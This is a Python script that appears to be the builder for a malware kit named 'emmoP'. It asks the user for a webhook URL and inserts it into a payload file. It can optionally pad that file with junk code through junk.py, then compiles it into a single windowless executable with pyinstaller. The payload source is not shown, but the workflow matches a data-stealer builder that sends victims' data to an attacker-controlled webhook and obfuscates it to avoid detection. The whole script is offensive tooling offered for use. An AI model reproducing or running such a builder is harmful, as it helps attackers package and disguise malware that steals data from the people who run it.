from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """
                                                $$$$$$$\  
                                                $$  __$$\ 
 $$$$$$\  $$$$$$\$$$$\  $$$$$$\$$$$\   $$$$$$\  $$ |  $$ |
$$  __$$\ $$  _$$  _$$\ $$  _$$  _$$\ $$  __$$\ $$$$$$$  |
$$$$$$$$ |$$ / $$ / $$ |$$ / $$ / $$ |$$ /  $$ |$$  ____/ 
$$   ____|$$ | $$ | $$ |$$ | $$ | $$ |$$ |  $$ |$$ |      
\$$$$$$$\ $$ | $$ | $$ |$$ | $$ | $$ |\$$$$$$  |$$ |      
 \_______|\__| \__| \__|\__| \__| \__| \______/ \__|      
                                                          
                Press Enter to continue                                        

"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTRED_EX}

                                                $$$$$$$\  
                                                $$  __$$\ 
 $$$$$$\  $$$$$$\$$$$\  $$$$$$\$$$$\   $$$$$$\  $$ |  $$ |
$$  __$$\ $$  _$$  _$$\ $$  _$$  _$$\ $$  __$$\ $$$$$$$  |
$$$$$$$$ |$$ / $$ / $$ |$$ / $$ / $$ |$$ /  $$ |$$  ____/ 
$$   ____|$$ | $$ | $$ |$$ | $$ | $$ |$$ |  $$ |$$ |      
\$$$$$$$\ $$ | $$ | $$ |$$ | $$ | $$ |\$$$$$$  |$$ |      
 \_______|\__| \__| \__|\__| \__| \__| \______/ \__|      
                                                          

""")
time.sleep(1)


while True:
    
    print("\nWhich option do you want to choose: ")
    print("\n1. Build Exe")
    print("\n2. Close")
    print("\nMake your selection: ", end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "emmoP.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nJunk code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

        while True:
            answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

    elif choice == "2":
        break

    else:
        break